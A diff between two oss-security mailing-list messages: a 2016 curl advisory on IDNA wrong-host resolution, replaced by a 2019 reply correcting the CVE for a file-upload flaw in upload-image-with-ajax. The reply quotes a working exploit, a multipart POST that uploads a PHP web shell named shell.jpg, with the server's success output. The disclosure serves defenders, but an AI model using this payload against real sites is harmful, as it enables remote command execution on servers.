@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["2627" "Wednesday" "2" "November" "2016" "08:13:26" "+0100" "Daniel Stenberg" "daniel@haxx.se" "<alpine.DEB.2.20.1611020812500.375@tvnag.unkk.fr>" "89" "[oss-security] [SECURITY ADVISORY] IDNA 2003 makes curl use wrong host" "^Date:" nil nil "11" "2016110207:13:26" "[oss-security] [SECURITY ADVISORY] IDNA 2003 makes curl use wrong host" (number mark "        daniel@haxx. Nov  2   89/2627  " thread-indent "\"[oss-security] [SECURITY ADVISORY] IDNA 2003 makes curl use wrong host\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["2495" "Monday" "23" "December" "2019" "16:52:05" "-0500" "Larry W. Cashdollar" "larry0@me.com" nil "81" nil "^Date:" nil nil "12" nil nil (number mark "        larry0@me.co Dec 23   81/2495  " thread-indent "\"[oss-security] Re: Arbitrary file upload vulnerability in upload-image-with-ajax v1.0\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Re: Arbitrary file upload vulnerability in upload-image-with-ajax v1.0" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 29990 invoked by uid 550); 2 Nov 2016 07:13:43 -0000
+Received: (qmail 1612 invoked by uid 550); 23 Dec 2019 21:52:20 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,109 +11,117 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 29789 invoked from network); 2 Nov 2016 07:13:39 -0000
-X-Authentication-Warning: giant.haxx.se: dast owned process doing -bs
-X-X-Sender: dast@giant.haxx.se
-Message-ID: <alpine.DEB.2.20.1611020812500.375@tvnag.unkk.fr>
-User-Agent: Alpine 2.20 (DEB 67 2015-01-07)
-X-fromdanielhimself: yes
-MIME-Version: 1.0
-Content-Type: multipart/mixed; BOUNDARY="1129329158-1283815874-1478070806=:375"
-Date: Wed, 2 Nov 2016 08:13:26 +0100 (CET)
-From: Daniel Stenberg <daniel@haxx.se>
+Received: (qmail 1594 invoked from network); 23 Dec 2019 21:52:20 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=1a1hai;
+	t=1577137927; bh=mk1BMjoKvSW/DCY6d0bb91IivFgeKCsejexd0K6ZotI=;
+	h=Date:Subject:From:To:Message-ID:Content-type;
+	b=HVhMTDaVJRIOVL2/Jj/RtVq+pYHRzvpqKNBaohHPpf8tzw2bg5Px3k6TrX2np5Ets
+	 fND0L8ZhxDWsLF2trBt92P96aNuKQZtvOSi/cIoGbN7jahr0GwnN6hcwRQGx+rEThQ
+	 7SvcXC/a2W45myUWKVpoVCniBoUO3DJf5fwgW8FDLcNhoB/lXWvD13bqPJ5fAN+sm9
+	 Vp2BH0UBNAtruioEbLlzSo0gEmeFNWL6DRDUdawcJarkgKeBZEzAqveCt8upjqi8KH
+	 J+13bi1RUEZLai8ZzWearssjL2q4ZeUyKUAs5F+fZqmQNMlfKWdFvTM1pnZ22whEMI
+	 oWDsyfrM5Ijkw==
+User-Agent: Microsoft-MacOutlook/10.20.0.191208
+Message-ID: <3894D4AF-10B8-46F7-BAF5-C800F8FCFE20@me.com>
+Thread-Topic: Arbitrary file upload vulnerability in upload-image-with-ajax
+ v1.0
+References: <BA02B4C0-17B0-4625-ABC8-FA6F52379002@me.com>
+In-Reply-To: <BA02B4C0-17B0-4625-ABC8-FA6F52379002@me.com>
+Mime-version: 1.0
+Content-type: text/plain;
+	charset="UTF-8"
+Content-transfer-encoding: quoted-printable
+X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10434:,, definitions=2019-12-23_09:,,
+ signatures=0
+X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 suspectscore=0 malwarescore=0
+ phishscore=0 bulkscore=0 spamscore=0 clxscore=1015 mlxscore=0
+ mlxlogscore=787 adultscore=0 classifier=spam adjust=0 reason=mlx
+ scancount=1 engine=8.0.1-1908290000 definitions=main-1912230190
+Date: Mon, 23 Dec 2019 16:52:05 -0500
+From: "Larry W. Cashdollar" <larry0@me.com>
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] [SECURITY ADVISORY] IDNA 2003 makes curl use wrong host
-To: curl security announcements -- curl users <curl-users@cool.haxx.se>,
-        curl-announce@cool.haxx.se,
-        libcurl hacking <curl-library@cool.haxx.se>,
-        oss-security@lists.openwall.com
+Subject: [oss-security] Re: Arbitrary file upload vulnerability in upload-image-with-ajax
+ v1.0
+To: Open Security <oss-security@lists.openwall.com>
 
---1129329158-1283815874-1478070806=:375
-Content-Type: text/plain; format=flowed; charset=ISO-8859-15
-Content-Transfer-Encoding: 8BIT
+Hello,
 
-IDNA 2003 makes curl use wrong host
-===================================
+An update and a correction.
 
-Project cURL Security Advisory, November 2, 2016 -
-[Permalink](https://curl.haxx.se/docs/adv_20161102K.html)
+The CVE number should be CVE-2019-8293.  The software author also has fixed=
+ the vulnerability:
 
-VULNERABILITY
--------------
+https://github.com/abcprintf/upload-image-with-ajax/commit/71436ba510201039=
+7519d4b25ea57591cfb4974c
 
-When curl is built with libidn to handle International Domain Names (IDNA), it
-translates them to puny code for DNS resolving using the IDNA 2003 standard,
-while IDNA 2008 is the modern and up-to-date IDNA standard.
+Thanks,
+Larry
 
-This misalignment causes problems with for example domains using the German ﬂ
-character (known as the Unicode Character 'LATIN SMALL LETTER SHARP S') which
-is used at times in the .de TLD and is translated differently in the two IDNA
-standards, leading to users potentially and unknowingly issuing network
-transfer requests to the wrong host.
+=EF=BB=BFOn 12/23/19, 12:09 PM, "Larry W. Cashdollar" <larry0@me.com> wrote:
 
-For example, `straﬂe.de` is translated into `strasse.de` using IDNA 2003 but
-is translated into `xn--strae-oqa.de` using IDNA 2008. Needless to say, those
-host names could very well resolve to different addresses and be two
-completely independent servers. IDNA 2008 is mandatory for .de domains.
+    Title: Arbitrary file upload vulnerability in upload-image-with-ajax
+    Author: Larry W. Cashdollar
+    Date: 2019-12-16
+    CVE-ID:[CVE-2019-8292]
+    Download Site: https://github.com/abcprintf/upload-image-with-ajax/
+    Vendor: adcprintf
+    Vendor Notified: 2019-12-16
+    Vendor Contact: wh.cprintf@gmail.com
+    Advisory: http://www.vapidlabs.com/advisory.php?v=3D211
+    Description: upload-image-with-ajax
+    Vulnerability:
+    The code below changes the $ready flag to true if the file conforms to =
+the size of < 1000000. Reversing the check that the file is an image. So, a=
+ .php file can be uploaded with only a warning allowing code execution.
+=20=20=20=20
+    $ready =3D false;
+    if((($imageType =3D=3D "image/jpeg") || ($imageType =3D=3D "image/jpg")=
+ || ($imageType =3D=3D "image/png"))&&in_array($fileExt, $validext)){
+    $ready =3D true;
+    }else{
+    echo "was not an image
+    ";
+    /You should abort the upload right here/
+    }
+    if($_FILES["fileUpload"]["size"] < 1000000){
+    $ready =3D true;
+    echo "file size is ".$_FILES['fileUpload']["size"]."
+    ";
+    }else{
+    echo "file was TOO BIG!";
+    }
+=20=20=20=20
+    Exploit Code:
+     $ ./fileupload_exploit 192.168.0.3 80 /upload-image-with-ajax/upload.p=
+hp
+    POST request size is 469 bytes
+=20=20=20=20=20
+    Sending Payload:
+    POST //upload-image-with-ajax/upload.php HTTP/1.1
+    Host: 192.168.0.3
+    User-Agent: File Upload Exploiter/v1.2
+    Accept: */*
+    Content-Length: 237
+    Content-Type: multipart/form-data; boundary=3D------------------------c=
+8e05c8871143853
+=20=20=20=20=20
+    --------------------------c8e05c8871143853
+    Content-Disposition: form-data; name=3D"fileUpload"; filename=3D"shell.=
+jpg"
+    Content-Type: image/jpeg
+=20=20=20=20=20
+    <?php $cmd=3D$_GET['cmd']; system($cmd);?>
+=20=20=20=20=20
+    --------------------------c8e05c8871143853--
+=20=20=20=20=20
+    HTTP/1.1 200 OK
+    Date: Mon, 16 Dec 2019 04:39:56 GMT
+    Server: Apache/2.4.25 (Debian)
+    Content-Length: 37
+    Content-Type: text/html; charset=3DUTF-8
+=20=20=20=20=20
+    file size is 42<br>upload successful!
+    [+] Total bytes read: 185
+=20=20=20=20
 
-curl is not alone with this problem, as there's currently a big flux in the
-world of network user-agents about which IDNA version to support and use.
 
-This name problem exists for DNS-using protocols in curl, but only when built
-to use libidn.
-
-We are not aware of any exploit of this flaw.
-
-INFO
-----
-
-The Common Vulnerabilities and Exposures (CVE) project has assigned the name
-CVE-2016-8625 to this issue.
-
-AFFECTED VERSIONS
------------------
-
-This flaw exists in the following curl versions.
-
-- Affected versions: curl 7.12.0 to and including 7.50.3
-- Not affected versions: curl < 7.12.0 and curl >= 7.51.0
-
-libcurl is used by many applications, but not always advertised as such!
-
-THE SOLUTION
-------------
-
-In version 7.51.0, the parser function is fixed.
-
-A [patch for CVE-2016-8625](https://curl.haxx.se/CVE-2016-8625.patch) is
-available.
-
-RECOMMENDATIONS
----------------
-
-We suggest you take one of the following actions immediately, in order of
-preference:
-
-  A - Upgrade curl and libcurl to version 7.51.0
-
-  B - Apply the patch to your version and rebuild
-
-TIME LINE
----------
-
-It was first reported to the curl project on October 11 by Christian Heimes.
-
-We contacted distros@openwall on October 19.
-
-curl 7.51.0 was released on November 2 2016, coordinated with the publication
-of this advisory.
-
-CREDITS
--------
-
-Thanks to Christian Heimes
-
--- 
-
-  / daniel.haxx.se
---1129329158-1283815874-1478070806=:375--
